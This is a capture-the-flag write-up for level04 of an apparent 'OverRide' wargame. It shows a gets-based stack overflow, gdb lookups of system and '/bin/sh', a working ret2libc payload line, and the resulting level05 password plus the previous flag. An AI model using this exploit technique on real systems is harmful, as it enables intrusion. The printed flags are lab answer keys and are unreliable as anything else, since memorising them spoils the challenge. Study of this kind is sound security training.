# Write up

We download the binary : `scp -P 4242 level04@192.168.43.94:level04 level04` and disassemble it for translation.
On the translated code, we notice a pointed called by gets 144 bytes before the stack top, we search the offset by
incrementing by 4 bytes and find that for 156 bytes we have an interesting result :
```
level04@OverRide:~$ python -c "print 'A' * 156" | ./level04
Give me some shellcode, k
Give me some shellcode, k

```
Like the level02 we use a ret2libC exploit to make it easy :
```
(gdb) print &system
$1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
(gdb) find &system, +9999999, "/bin/sh"
0xf7f897ec
```
Then we exec our payload :
```
(python -c "print 'A' * 156 + '\xd0\xae\xe6\xf7' + 'LIDL' + '\xec\x97\xf8\xf7'"; cat) | ./level04
```
Which gives us our shell.
```
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

(Previous flag : kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf)